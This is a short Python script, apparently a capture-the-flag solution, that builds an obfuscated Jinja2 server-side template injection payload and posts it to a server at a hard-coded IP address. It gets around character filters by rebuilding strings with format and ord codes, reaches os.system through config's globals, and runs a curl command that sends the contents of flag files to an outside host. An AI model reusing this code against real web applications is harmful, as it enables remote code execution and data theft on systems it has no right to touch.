import sys
import requests
import html

prefix = """
{% set p=self|string|urlencode|first %}
{% set c=config|join|sort|unique|slice(6)|list|first|slice(2)|list|last|join|first|lower %}
{% set pc=p~c %}
"""
a = ""
idx = 0


def bypass(ss):
    global prefix
    global idx
    prefix += (
        f"\n{{% set p{idx}=({','.join(['pc' for i in range(len(ss))])})|join %}}"
        + f"\n{{% set n{idx} = p{idx} |format ({','.join([str(ord(c)) for c in ss])}) %}}"
        + f"\n{{% print(n{idx})%}}"
    )
    idx += 1
    return f"n{idx-1}"


# config.__class__.__init__.__globals__
a += f"""
{{% set final=config|attr({bypass('__class__')})|attr({bypass('__init__')})|attr({bypass('__globals__')})|items
|list|slice(2)|list|last|slice(2)|list|first|slice(2)|list|last|first|last|attr({bypass('system')})
 %}} {{% print(final) %}}
 {{% print(final({bypass('curl -X POST https://c.cjis.ooo -d "$(cat flag*)"')}))  %}}

"""

a = prefix + a
print(a)
resp = requests.post("http://34.80.180.179:5000", data={"fruit_selector": a})
print(html.unescape(resp.text[756:]))
